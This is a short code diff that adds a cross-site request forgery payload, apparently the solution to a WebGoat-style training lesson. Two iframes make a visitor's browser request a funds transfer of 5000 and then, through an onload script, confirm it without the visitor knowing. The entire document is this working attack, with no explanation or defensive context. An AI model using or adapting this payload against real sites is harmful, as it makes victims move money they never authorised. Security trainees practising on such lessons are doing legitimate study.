@@ -1,0 +1,9 @@
+<script type="text/javascript">
+function get_confirmation() {
+  var transfer_page;
+  transfer_page=document.getElementById("transfer_funds");
+  transfer_page.src="attack?Screen=2014084448&menu=900&transfer=CONFIRMED";
+}
+</script> 
+<iframe src="attack?Screen=2014084448&menu=900&transfer=5000" onload="get_confirmation()"> </iframe>
+<iframe id="transfer_funds"> </iframe>
